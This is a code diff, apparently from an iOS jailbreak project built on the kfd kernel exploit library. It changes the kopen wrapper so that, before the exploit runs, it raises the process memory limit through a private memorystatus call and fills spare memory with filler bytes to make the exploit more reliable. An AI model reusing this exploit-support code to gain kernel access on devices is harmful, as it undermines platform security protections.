@@ -8,6 +8,7 @@
 #include "krw.h"
 #include "libkfd.h"
 //#include "mdc/helpers.h"
+#include "memoryControl.h"
 #include "kpf/patchfinder.h"
 
 uint64_t _kfd = 0;
@@ -21,11 +22,68 @@ uint64_t unsign_kptr(uint64_t pac_kaddr) {
     return pac_kaddr;
 }
 
-uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
+int find_offsets_wrapper(void);
+__attribute__ ((optnone)) uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method, size_t headroom, bool use_headroom)
 {
-//    remove([NSString stringWithFormat:@"%@/Documents/kfund_offsets.plist", NSHomeDirectory()].UTF8String);  //TEMPORARY: remove offsets plist to check if patchfinder is working
-//    do_static_patchfinder();
-    _kfd = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
+    //find_offsets_wrapper();
+    if (use_headroom) {
+        size_t STATIC_HEADROOM = (headroom * (size_t)1024 * (size_t)1024);
+        uint64_t* memory_hog = NULL;
+        size_t pagesize = sysconf(_SC_PAGESIZE);
+        size_t memory_avail = os_proc_available_memory();
+        size_t hog_headroom = STATIC_HEADROOM + puaf_pages * pagesize;
+        size_t memory_to_hog = memory_avail > hog_headroom ? memory_avail - hog_headroom: 0;
+        int32_t old_memory_limit = 0;
+        memorystatus_memlimit_properties2_t mmprops;
+        print_usize(memory_avail);
+        print_usize(hog_headroom);
+        print_usize(hog_headroom);
+        print_usize(memory_to_hog);
+        print_usize(memory_to_hog);
+        if (hasEntitlement(CFSTR("com.apple.private.memorystatus"))) {
+            uint32_t new_memory_limit = (uint32_t)(getPhysicalMemorySize() / UINT64_C(1048576)) * 2;
+            int ret = memorystatus_control(MEMORYSTATUS_CMD_GET_MEMLIMIT_PROPERTIES, getpid(), 0, &mmprops, sizeof(mmprops));
+            if (ret == 0) {
+                print_i32(mmprops.v1.memlimit_active);
+                old_memory_limit = mmprops.v1.memlimit_active;
+                ret = memorystatus_control(MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT, getpid(), new_memory_limit, NULL, 0);
+                if (ret == 0) {
+                    print_success("The memory limit for pid %d has been set to %u MiB successfully", getpid(), new_memory_limit);
+                } else {
+                    print_warning("Failed to set memory limit: %d (%s)", errno, strerror(errno));
+                }
+            } else {
+                print_warning("could not get current memory limits");
+            }
+        }
+        if (memory_avail > hog_headroom) {
+            memory_hog = malloc(memory_to_hog);
+            if (memory_hog != NULL) {
+                for (uint64_t i = 0; i < memory_to_hog / sizeof(uint64_t); i++) {
+                    memory_hog[i] = 0x4141414141414141;
+                }
+            }
+            print_message("Filled up hogged memory with A's");
+        } else {
+            print_message("Did not hog memory because there is too little free memory");
+        }
+        print_message("Performing kopen");
+        _kfd = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
+
+        if (memory_hog) free(memory_hog);
+        if (old_memory_limit) {
+            // set the limit back because it affects os_proc_available_memory
+            int ret = memorystatus_control(MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT, getpid(), old_memory_limit, NULL, 0);
+            if (ret == 0) {
+                print_success("[memoryHogger] The memory limit for pid %d has been set to %u MiB successfully", getpid(), old_memory_limit);
+            } else {
+                print_warning("[memoryHogger] Failed to set memory limit: %d (%s)", errno, strerror(errno));
+            }
+        }
+    } else {
+        _kfd = kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
+    }
+
     return _kfd;
 }
 
